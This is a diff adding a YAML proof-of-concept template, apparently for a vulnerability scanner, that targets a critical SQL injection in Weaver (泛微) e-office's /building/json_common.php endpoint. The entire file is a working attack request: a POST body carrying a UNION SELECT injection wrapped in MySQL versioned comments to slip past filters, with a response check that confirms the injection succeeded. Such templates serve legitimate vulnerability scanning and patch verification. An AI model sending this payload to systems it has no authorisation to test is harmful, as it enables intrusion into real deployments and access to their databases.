@@ -1,0 +1,18 @@
+id: poc-yaml-weaver-e-office-json-common-php-sqli
+info:
+  name: 泛微 e-office json_common.php sql注入漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: e-cology
+variables:
+  t1: random_int(1,100)
+requests:
+- method: POST
+  path: /building/json_common.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5({{.t1}})
+    ,4#|2|333
+  expression: status_code == 200 && contains(body,md5(t1))
+transport: http
